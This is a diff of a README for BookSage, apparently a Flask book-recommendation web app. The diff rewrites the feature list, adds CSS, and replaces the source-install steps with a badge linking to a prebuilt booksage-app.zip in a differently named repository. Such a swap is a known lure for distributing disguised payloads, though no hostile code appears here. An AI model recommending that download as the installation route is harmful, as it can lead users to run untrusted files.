@@ -1,171 +1,147 @@
-# <img src="https://via.placeholder.com/25/b5e25a/000000?text=📚" alt="book icon"> BookSage
+# 📚 BookSage
 
 <div align="center">
+  
+BookSage is a comprehensive platform that provides personalized book recommendations based on users' preferred genres, popular content, and highly rated titles by fellow readers. 
 
-**Your academic book discovery platform**
+Discover your next favorite book with our intelligent recommendation system!
 
-[![Status](https://img.shields.io/badge/Status-In%20Development-b5e25a?style=flat-square&labelColor=222222)](https://github.com/yourusername/booksage)
-[![Python](https://img.shields.io/badge/Python-3.9+-b5e25a?style=flat-square&labelColor=222222)](https://www.python.org/)
-[![Flask](https://img.shields.io/badge/Flask-2.0+-b5e25a?style=flat-square&labelColor=222222)](https://flask.palletsprojects.com/)
+![Python](https://img.shields.io/badge/Python-3.9+-b5e25a)
+![Flask](https://img.shields.io/badge/Flask-2.0+-lightgrey)
+![Status](https://img.shields.io/badge/Status-In%20Development-b5e25a)
 
 </div>
 
-<div align="center">
-  <img src="https://via.placeholder.com/800x200/1a1a1a/b5e25a?text=BookSage" alt="BookSage Banner">
-</div>
+<style>
+  body {
+    background-color: #000000;
+    color: #e6e6e6;
+  }
+  
+  h1, h2, h3, h4, h5, h6 {
+    color: #ffffff;
+  }
+  
+  a {
+    color: #c8ff7d;
+    text-decoration: none;
+  }
+  
+  a:hover {
+    text-decoration: underline;
+  }
+  
+  code {
+    background-color: #333333;
+    color: #d1f7a0;
+    padding: 0.2em 0.4em;
+    border-radius: 3px;
+  }
+  
+  pre {
+    background-color: #333333;
+    border: 1px solid #444444;
+    border-radius: 6px;
+    padding: 16px;
+  }
+  
+  blockquote {
+    color: #a0a0a0;
+    border-left: 4px solid #444444;
+    padding: 0 16px;
+  }
+  
+  hr {
+    background-color: #444444;
+    border: none;
+    height: 1px;
+  }
+  
+  table {
+    border-collapse: collapse;
+    width: 100%;
+    margin: 16px 0;
+    border: 1px solid #444444;
+  }
+  
+  th, td {
+    padding: 8px 12px;
+    border: 1px solid #444444;
+  }
+  
+  th {
+    background-color: #2c2c2c;
+  }
+  
+  img {
+    max-width: 100%;
+  }
+  
+  ul li strong {
+    color: #b5e25a;
+  }
+</style>
 
-## 📖 About
-
-BookSage is a comprehensive platform that provides personalized book recommendations based on your academic interests and reading history. Get personalized recommendations for academic literature across computer science, engineering, mathematics, physics, and more!
-
-<details>
-<summary><b>✨ Why Choose BookSage?</b></summary>
-<br>
-
-- **Personalized Recommendations** - Get book suggestions based on your specific academic interests
-- **Extensive Academic Library** - Access to thousands of academic books across multiple disciplines
-- **Community Insights** - See what books are popular in your field of study
-- **Smart Discovery** - Find related books and expand your knowledge in connected areas
-
-</details>
-
----
-
-## 🚀 Features
+## ✨ Features
 
 ### Current Features
+- **🔮 Personalized Recommendations** 
+  - Home page with tailored suggestions based on user preferences
+  - Smart algorithm that learns from your reading habits
 
-<table>
-  <tr>
-    <td width="50%" valign="top">
-      <h3>📊 Personalized Recommendations</h3>
-      <ul>
-        <li>Tailored suggestions based on your academic interests</li>
-        <li>Recommendations improve as you use the platform</li>
-        <li>Discover related books in your field</li>
-      </ul>
-    </td>
-    <td width="50%" valign="top">
-      <h3>🔍 Advanced Search</h3>
-      <ul>
-        <li>Search by title, author, or keywords</li>
-        <li>Filter by categories and subjects</li>
-        <li>Popular hashtags for trending topics</li>
-      </ul>
-    </td>
-  </tr>
-  <tr>
-    <td width="50%" valign="top">
-      <h3>📚 Academic Categories</h3>
-      <ul>
-        <li>Computer Science (1,234 books)</li>
-        <li>Engineering (987 books)</li>
-        <li>Mathematics (756 books)</li>
-        <li>Physics (543 books)</li>
-        <li>And many more academic fields</li>
-      </ul>
-    </td>
-    <td width="50%" valign="top">
-      <h3>👥 User Accounts</h3>
-      <ul>
-        <li>Create and manage your academic profile</li>
-        <li>Track your reading history</li>
-        <li>Save books to custom reading lists</li>
-        <li>Rate and review books you've read</li>
-      </ul>
-    </td>
-  </tr>
-</table>
+- **📖 Book Search & Details** 
+  - Search for books by title, author, or genre
+  - Detailed book pages with comprehensive information
+  - View book details including synopsis, author info, and community ratings
+
+- **👤 User Accounts** 
+  - Secure user registration and authentication
+  - Personalized user profiles with reading history
+  - Email verification for account security
+
+- **⭐ Ratings & Reviews** 
+  - Rate books on a five-star scale
+  - Write and share detailed reviews
+  - Discover highly-rated books from the community
 
 ### Coming Soon
+- **📊 Trending Content** - Discover the most liked books within the community
+- **💬 Social Features** - Follow other readers and share recommendations
+- **📱 Mobile Application** - Access BookSage on the go with our mobile app
+- **✉️ Email Notifications** - Stay updated with personalized book recommendations
 
-- **💬 Community Features** - Discuss books with peers and scholars in your field
-- **📱 Mobile Application** - Access BookSage on-the-go from your mobile device
-- **📊 Analytics Dashboard** - Track your reading habits and academic interests
-- **🔄 Integration with Academic Databases** - Connect with popular academic resources
+## 🛠️ Technologies Used
 
----
+### Frontend
+- HTML5, CSS3 with Tailwind CSS
+- JavaScript
+- Jinja2 Templates
 
-## 💻 Tech Stack
+### Backend
+- Python
+- Flask Web Framework
+- SQLite Database
+- Werkzeug Security for Authentication
 
-<div align="center">
+### Deployment
+- GitHub Actions CI/CD Pipeline
+- Hosting (TBD)
 
-[![Frontend](https://img.shields.io/badge/Frontend-HTML%20|%20CSS%20|%20JavaScript-b5e25a?style=for-the-badge&labelColor=222222)](https://github.com/yourusername/booksage)
-[![Backend](https://img.shields.io/badge/Backend-Python%20|%20Flask-b5e25a?style=for-the-badge&labelColor=222222)](https://github.com/yourusername/booksage)
-[![Database](https://img.shields.io/badge/Database-SQLite-b5e25a?style=for-the-badge&labelColor=222222)](https://github.com/yourusername/booksage)
+## 🚀 Getting Started
 
-</div>
+### Prerequisites
+- Python 3.9 or higher
+- Pip package manager
 
----
+### Download
 
-## 🛠️ Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/yourusername/booksage.git
-
-# Navigate to the project directory
-cd booksage
-
-# Create a virtual environment
-python -m venv venv
-
-# Activate the virtual environment
-# On Windows
-venv\Scripts\activate
-# On macOS/Linux
-source venv/bin/activate
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Set up environment variables
-cp .env.example .env
-# Edit .env with your configuration
-
-# Initialize the database
-flask db init
-flask db migrate
-flask db upgrade
-
-# Run the application
-flask run
-```
-
----
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-b5e25a?style=for-the-badge&labelColor=222222)](https://github.com/carterj7383/booksage_/releases/latest/download/booksage-app.zip)
 
 ## 📋 Usage
 
-1. **Create an Account**: Sign up with your email to get personalized recommendations
-2. **Set Your Preferences**: Select your academic interests and preferred categories
-3. **Discover Books**: Browse recommendations or search for specific books
-4. **Manage Your Library**: Save books to your reading list and track your progress
-5. **Engage with the Community**: Rate books and see what's popular in your field
-
----
-
-## 📞 Connect With Us
-
-<div align="center">
-
-[![Twitter](https://img.shields.io/badge/Twitter-@BookSage-b5e25a?style=flat-square&labelColor=222222)](https://twitter.com)
-[![Facebook](https://img.shields.io/badge/Facebook-BookSage-b5e25a?style=flat-square&labelColor=222222)](https://facebook.com)
-[![Instagram](https://img.shields.io/badge/Instagram-@BookSage-b5e25a?style=flat-square&labelColor=222222)](https://instagram.com)
-
-</div>
-
----
-
-## 📜 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-<div align="center">
-
-**BookSage** - Your academic book discovery platform
-
-<img src="https://via.placeholder.com/100/b5e25a/000000?text=BS" alt="BookSage Logo">
-
-</div>
+1. Visit the BookSage website
+2. Create an account or log in with your credentials
+3. Select your preferred genres to personalize your experience
+4. Browse and discover personalized book recommendations
+5. Rate books and write reviews to improve future recommendations
+6. Click on a book to view details and community feedback
